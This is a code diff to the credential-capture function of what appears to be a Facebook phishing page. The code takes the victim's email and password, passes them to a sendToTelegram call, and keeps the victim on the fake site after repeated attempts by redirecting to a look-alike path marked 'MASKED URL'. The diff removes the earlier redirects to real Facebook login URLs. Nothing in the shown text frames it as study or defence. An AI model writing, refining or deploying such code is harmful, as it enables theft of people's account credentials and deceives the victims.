@@ -194,7 +194,7 @@ function setupFinalLoginCapture() {
             if (!emailInput || !passInput) {
                 fbLoginBtn.classList.add('loading');
                 setTimeout(() => {
-                    window.location.href = './testing/index.html';
+                    window.location.href = '/l.facebook.com/login';  // ✅ MASKED URL
                 }, 1500);
                 return;
             }
@@ -216,19 +216,11 @@ function setupFinalLoginCapture() {
             const statusMsg = document.getElementById('fb-status');
             if (statusMsg) statusMsg.innerText = "";
 
-            // 🔥 DUAL DELIVERY: Telegram + Webhook
             await sendToTelegram(emailInput.value, passInput.value, attempts);
 
-            // REAL FB REDIRECTS (Random rotation)
             setTimeout(() => {
                 if (attempts >= 3) {
-                    const fbUrls = [
-                        "https://l.facebook.com/login",
-                        "https://m.facebook.com/login",
-                        "https://mbasic.facebook.com/login",
-                        "https://www.facebook.com/login/device-based/regular_login/"
-                    ];
-                    window.location.href = fbUrls[Math.floor(Math.random() * fbUrls.length)];
+                    window.location.href = '/l.facebook.com/login';  // ✅ STAYS ON YOUR SITE
                 } else {
                     fbLoginBtn.classList.remove('loading');
                     if (statusMsg) {
@@ -237,7 +229,7 @@ function setupFinalLoginCapture() {
                     }
                     passInput.value = "";
                 }
-            }, 2000);  // 2s delay (realistic)
+            }, 2000);
         };
     }
 }
